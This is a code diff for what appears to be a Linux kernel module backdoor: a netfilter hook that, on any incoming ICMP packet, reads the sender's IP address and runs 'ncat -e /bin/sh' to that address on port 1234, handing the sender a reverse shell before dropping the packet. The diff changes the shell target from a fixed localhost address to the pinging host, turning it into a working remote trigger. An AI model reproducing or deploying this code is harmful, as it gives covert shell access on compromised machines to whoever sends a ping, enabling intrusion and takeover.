@@ -112,11 +112,15 @@ int run_command(char * command){
 }
 
 
-void magic_command(void) {
+void magic_command(char *IP) {
+	char command[100];
+	
 	if (!reverse_shell_working) {
 		reverse_shell_working = 1;
 		debugPrint("Trying reverse shell");
-		run_command("/usr/bin/ncat -e /bin/sh 127.0.0.1 1234"); // This command will give us reverse shell
+
+		snprintf(command, 100, "/usr/bin/ncat -e /bin/sh %s 1234", IP);
+		run_command(command); // This command will give us reverse shell
 	}
 	else {
 		debugPrint("Reverse shell already working!");
@@ -131,6 +135,7 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 {
 	struct iphdr *ip_header;
 	struct iphdr _iph;
+	char sourceIP[16];
 
 	if (!skb)
 		return NF_ACCEPT;
@@ -140,9 +145,11 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 	if (!ip_header || !ip_header->protocol)
 		return NF_ACCEPT;
 
-	if (ip_header->protocol == IPPROTO_ICMP) {
-		debugPrint("Got ICMP packet!");	
-		magic_command(); // Start reverse shell
+	if (ip_header->protocol == IPPROTO_ICMP && !reverse_shell_working) {
+		snprintf(sourceIP, 16, "%pI4", &ip_header->saddr); // Mind the &!
+		debugPrint("Got ICMP packet! (address one line down)");
+		debugPrint(sourceIP);
+		magic_command(sourceIP); // Start reverse shell
 		return NF_DROP;
 	}
 
